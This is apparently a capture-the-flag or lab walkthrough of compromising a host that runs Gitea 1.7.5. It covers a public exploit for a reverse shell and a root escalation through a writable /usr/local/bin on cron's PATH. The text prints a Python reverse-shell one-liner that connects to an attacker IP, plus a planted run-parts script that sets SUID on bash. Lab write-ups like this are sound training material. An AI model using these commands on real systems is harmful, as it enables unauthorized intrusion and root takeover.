I tried to log in as `anonymous` into FTP with no luck:

Then I started enumerating services and found that **Gitea 1.7.5** is running on **port 3000**.

![](../../../assets/3c628a6989ac321dc676957398e0e4ba.png)

I checked for exploits and found one:

![](../../../assets/692df4164f2603a752476ebd33ccb127.png)

As for further enumeration I did not find anything useful for the `Dropbear` SSH service.


# Initial Foothold

## 3000/TCP - HTTP

I downloaded the PoC and started modifying it:

![](../../../assets/14636249f3af98dc9bdd37f9cc30a6dc.png)

I now had to create a `shell` payload that I could use to get a reverse shell.

![](../../../assets/b8354c0a8bab1915e1f58cca0ba84d34.png)

I booted up my `nc` listener and got to work.

![](../../../assets/5432ef5afebb4c0409de3437c7348143.png)

Unfortunately after the **Succesful login** I got an error.

>[!fail]
>I went too fast, the premise is to create an account first.

I registered a new account:

```
test1
test123
```

![](../../../assets/1f8f2c2011f06a9889487b9bbb16d48f.png)

I then had to modify the PoC again to include the newly created user.

![](../../../assets/a3e324a77a3d30c0bc3d8fb06594604b.png)

For whatever reason the exploit still wouldn't fire correctly:

![](../../../assets/0f382a644ec896802899222aacc2195a.png)

I went ahead and reverted the machine.

After reverting the machine another problem showed up. The exploit succesfully uploaded but the reverse shell wouldn't fire. Time to try another payload:

![](../../../assets/83e1994d59dcca4991649ac59efb1fc1.png)

After many many reverts I FINALLY managed to get a shell:

![](../../../assets/802a1357ce112b203ef404bbb73dcf87.png)

I then upgraded the shell using `script -c bash /dev/null`:

# Privilege Escalation

Now that we have access we can get to enumerating the system and finding a way to exploit it.

I started off with `sudo -l` which gave me a surprise right away:

![](../../../assets/770b5af9f918a96a01cbfd12a00ee195.png)

I then went ahead and enumerated SUID/GUID binaries:

![](../../../assets/1ebef2317cf36cfa80342b5325e9dcc2.png)

I could've gone and enumerated it manually but instead I downloaded `linpeas.sh`:

![](../../../assets/3a1c4969ff10837557db3e64033f2809.png)

Right away I noticed the following:

![](../../../assets/39f665cdfb73e54d57ed808c3dacb5bb.png)

As well as:

![](../../../assets/b9f29aa527753250303754e3bdf1bf85.png)

>[!note]
>We see `/usr/bin/local` as an interesting writable directory. Itâ€™s also set up in the cron path in the second position.

I went ahead and enumerated the cron jobs:

![](../../../assets/1848e5ae7f316e74640af772b3828600.png)

![](../../../assets/eca3adfec6d564bab7cd33dbc229c7fb.png)

>[!important]
>At the top we notice the cron job `cd / && run-parts --report /etc/cron.hourly`. This means we could write a `run-parts` executable within `/usr/local/bin` which will then get executed within the hour and give us a `root` shell, as it the cron job is owned by `root`.

Let's put this in practice:

```bash
python3 -c 'import socket,subprocess,os;s=scoket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.238",2223));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

I made this in my Kali machine, then transferred it over and `chmod 777` the file and then waited for a root shell.

>[!fail]
>This took a really long time without any effect, I also tried a `msfvenom` payload to no avail.

## Succesful approach

```bash
echo "chmod +s /bin/bash" > run-parts
chmod +x run-parts

ls -la /bin/bash
-rwsr-sr-x 1 root root 1099016 May 15  2017 /bin/bash
```

We can now go ahead and run `bash -p` to elevate our shell:

>[!success]
>We have FINALLY after many reverts successfully escalated our privileges.
